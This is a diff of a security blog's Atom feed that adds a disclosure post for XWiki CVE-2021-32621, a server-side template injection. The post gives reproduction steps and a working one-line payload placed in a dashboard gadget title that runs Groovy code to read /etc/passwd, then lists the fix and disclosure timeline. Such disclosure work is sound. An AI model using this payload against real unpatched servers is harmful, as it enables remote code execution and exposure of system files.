@@ -1,4 +1,46 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://jay-from-future.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://jay-from-future.github.io//" rel="alternate" type="text/html" /><updated>2021-04-02T19:54:44+03:00</updated><id>https://jay-from-future.github.io//feed.xml</id><title type="html">Jay From Future’s Blog (but not about future or futures)</title><subtitle>Dark times lie ahead of us and there will be a time when we must choose between what is easy and what is right. (Albus Dumbledore, Harry Potter and the Goblet of Fire)</subtitle><entry><title type="html">Unauthorized access to Code With Me traffic (CVE-2021-25755)</title><link href="https://jay-from-future.github.io//cve/2021/04/02/code-with-me-cve.html" rel="alternate" type="text/html" title="Unauthorized access to Code With Me traffic (CVE-2021-25755)" /><published>2021-04-02T12:26:56+03:00</published><updated>2021-04-02T12:26:56+03:00</updated><id>https://jay-from-future.github.io//cve/2021/04/02/code-with-me-cve</id><content type="html" xml:base="https://jay-from-future.github.io//cve/2021/04/02/code-with-me-cve.html">&lt;p&gt;In this post I am going to share some details about &lt;a href=&quot;https://www.jetbrains.com/code-with-me/&quot;&gt;Code With Me&lt;/a&gt; traffic interception vulnerability &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2021-25755&quot;&gt;CVE-2021-25755&lt;/a&gt;. Code With Me is a new collaborative development and pair programming service from JetBrains that provides such experience &lt;em&gt;just one click away&lt;/em&gt;.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://jay-from-future.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://jay-from-future.github.io//" rel="alternate" type="text/html" /><updated>2021-06-17T19:45:47+03:00</updated><id>https://jay-from-future.github.io//feed.xml</id><title type="html">Jay From Future’s Blog (but not about future or futures)</title><subtitle>Dark times lie ahead of us and there will be a time when we must choose between what is easy and what is right. (Albus Dumbledore, Harry Potter and the Goblet of Fire)</subtitle><entry><title type="html">XWiki Platform RCE via gadget titles in the dashboard (CVE-2021-32621)</title><link href="https://jay-from-future.github.io//cve/2021/06/17/xwiki-rce-cve.html" rel="alternate" type="text/html" title="XWiki Platform RCE via gadget titles in the dashboard (CVE-2021-32621)" /><published>2021-06-17T19:07:56+03:00</published><updated>2021-06-17T19:07:56+03:00</updated><id>https://jay-from-future.github.io//cve/2021/06/17/xwiki-rce-cve</id><content type="html" xml:base="https://jay-from-future.github.io//cve/2021/06/17/xwiki-rce-cve.html">&lt;p&gt;It all started with &lt;a href=&quot;https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-7qw5-pqhc-xm4g&quot;&gt;Users with SCRIPT right can access the application server instance manager and create arbitrary Java objects through $request binding&lt;/a&gt;. I tried other fields where similar payload for Server-Side Template Injection could work and found one more.&lt;/p&gt;
+
+&lt;h2 id=&quot;short-description&quot;&gt;Short description:&lt;/h2&gt;
+
+&lt;p&gt;Registered users are able to execute server side code via gadget title (Server-Side Template Injection).&lt;/p&gt;
+
+&lt;h2 id=&quot;links&quot;&gt;Links:&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-h353-hc43-95vc&quot;&gt;Script injection without script or programming rights through Gadget titles&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://jira.xwiki.org/browse/XWIKI-17794&quot;&gt;XWIKI-17794&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2021-32621&quot;&gt;CVE-2021-32621&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;details&quot;&gt;Details:&lt;/h2&gt;
+
+&lt;p&gt;Full path to reproduce:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Open XWiki platform (I used http://playground.xwiki.org/ and local installation using docker image)&lt;/li&gt;
+  &lt;li&gt;Go to profile -&amp;gt; Edit -&amp;gt; My dashboard -&amp;gt; Add gadget&lt;/li&gt;
+  &lt;li&gt;Choose any gadget (e.g. content or python).&lt;/li&gt;
+  &lt;li&gt;Paste following payload into title (one line): &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$request.getServletContext().getAttribute(&quot;org.apache.tomcat.InstanceManager&quot;)
+.newInstance(&quot;javax.script.ScriptEngineManager&quot;).getEngineByName(&quot;groovy&quot;).eval(&quot;new File('/etc/passwd').text&quot;)&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Submit the gadget&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/rce_gadget_title_playground_xwiki_org.png&quot;&gt;&lt;img src=&quot;/images/rce_gadget_title_playground_xwiki_org.png&quot; alt=&quot;rce_gadget_title_playground_xwiki_org&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Fix in source code: &lt;a href=&quot;https://github.com/xwiki/xwiki-platform/commit/bb7068bd911f91e5511f3cfb03276c7ac81100bc&quot;&gt;XWIKI-17794: Properly interpret velocity in gadget titles&lt;/a&gt;. So now evaluation of title is wrapped with check for user right ‘SCRIPT’.&lt;/p&gt;
+
+&lt;h2 id=&quot;timeline&quot;&gt;Timeline:&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;14 Sep 2020 - reported to XWiki team&lt;/li&gt;
+  &lt;li&gt;12 Jan 2021 - confirmed and fixed&lt;/li&gt;
+  &lt;li&gt;18 May 2021 - published&lt;/li&gt;
+  &lt;li&gt;28 May 2021 - CVE assigned&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;acknowledgement&quot;&gt;Acknowledgement&lt;/h2&gt;
+
+&lt;p&gt;Thanks to &lt;a href=&quot;https://twitter.com/d4d89704243&quot;&gt;d4d&lt;/a&gt; for helping with working payload.&lt;/p&gt;</content><author><name></name></author><category term="cve" /><summary type="html">It all started with Users with SCRIPT right can access the application server instance manager and create arbitrary Java objects through $request binding. I tried other fields where similar payload for Server-Side Template Injection could work and found one more.</summary></entry><entry><title type="html">Unauthorized access to Code With Me traffic (CVE-2021-25755)</title><link href="https://jay-from-future.github.io//cve/2021/04/02/code-with-me-cve.html" rel="alternate" type="text/html" title="Unauthorized access to Code With Me traffic (CVE-2021-25755)" /><published>2021-04-02T12:26:56+03:00</published><updated>2021-04-02T12:26:56+03:00</updated><id>https://jay-from-future.github.io//cve/2021/04/02/code-with-me-cve</id><content type="html" xml:base="https://jay-from-future.github.io//cve/2021/04/02/code-with-me-cve.html">&lt;p&gt;In this post I am going to share some details about &lt;a href=&quot;https://www.jetbrains.com/code-with-me/&quot;&gt;Code With Me&lt;/a&gt; traffic interception vulnerability &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2021-25755&quot;&gt;CVE-2021-25755&lt;/a&gt;. Code With Me is a new collaborative development and pair programming service from JetBrains that provides such experience &lt;em&gt;just one click away&lt;/em&gt;.&lt;/p&gt;
 
 &lt;h2 id=&quot;short-description&quot;&gt;Short description:&lt;/h2&gt;
 
